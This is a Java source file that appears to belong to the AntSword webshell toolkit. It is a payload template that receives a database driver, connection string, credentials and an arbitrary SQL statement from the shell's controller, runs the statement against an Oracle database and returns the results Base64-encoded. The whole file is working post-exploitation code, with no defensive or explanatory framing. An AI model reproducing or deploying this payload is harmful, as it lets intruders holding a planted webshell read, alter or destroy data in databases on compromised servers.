package database.oracle;

import antSword.Template;

import java.sql.*;

public class Query extends Template {
    @Override
    public String run() throws Exception {
        String z1 = getParam("antswordargencode");
        String z2 = getParam("antswordargconn");
        String z3 = getParam("antswordargsql");
        return query(z1, z2, z3);

    }

    String Base64Encode(String str) {
        String version = System.getProperty("java.version");
        try {
            String ret = "";
            if (version.compareTo("1.9") >= 0) {
                Class Base64 = Class.forName("java.util.Base64");
                Object Encoder = Base64.getMethod("getEncoder", new Class[0]).invoke(Base64);
                ret = (String) Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, str.getBytes());
            } else {
                Class Base64 = Class.forName("sun.misc.BASE64Encoder");
                Object Encoder = Base64.getDeclaredConstructor().newInstance();
                ret = (String) Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, str.getBytes());
            }
            ret = ret.replaceAll("\r|\n", "");
            return ret;
        } catch (Exception e) {
            return "";
        }
    }

    String executeSQL(String encode, String conn, String sql, String columnsep, String rowsep, boolean needcoluname)
            throws Exception {
        String ret = "";
        String[] x = conn.trim().replace("\r\n", "\n").split("\n");
        Class.forName(x[0].trim());
        String url = x[1];
        Connection c = DriverManager.getConnection(url, x[2], x[3]);
        Statement stmt = c.createStatement();
        boolean isRS = stmt.execute(sql);
        if (isRS) {
            ResultSet rs = stmt.getResultSet();
            ResultSetMetaData rsmd = rs.getMetaData();

            if (needcoluname) {
                for (int i = 1; i <= rsmd.getColumnCount(); i++) {
                    String columnName = rsmd.getColumnName(i);
                    ret += columnName + columnsep;
                }
                ret += rowsep;
            }

            while (rs.next()) {
                for (int i = 1; i <= rsmd.getColumnCount(); i++) {
                    String columnValue = rs.getString(i);
                    ret += Base64Encode(columnValue) + columnsep;
                }
                ret += rowsep;
            }
        } else {
            ret += "Result" + columnsep + rowsep;
            int rowCount = stmt.getUpdateCount();
            if (rowCount > 0) {
                ret += Base64Encode("Rows changed = " + rowCount) + columnsep + rowsep;
            } else if (rowCount == 0) {
                ret += Base64Encode("No rows changed or statement was DDL command") + columnsep + rowsep;
            } else {
                ret += Base64Encode("False") + columnsep + rowsep;
            }
        }
        return ret;
    }

    String query(String encode, String conn, String sql) throws Exception {
        String columnsep = "\t|\t";
        String rowsep = "\r\n";
        return executeSQL(encode, conn, sql, columnsep, rowsep, true);
    }
}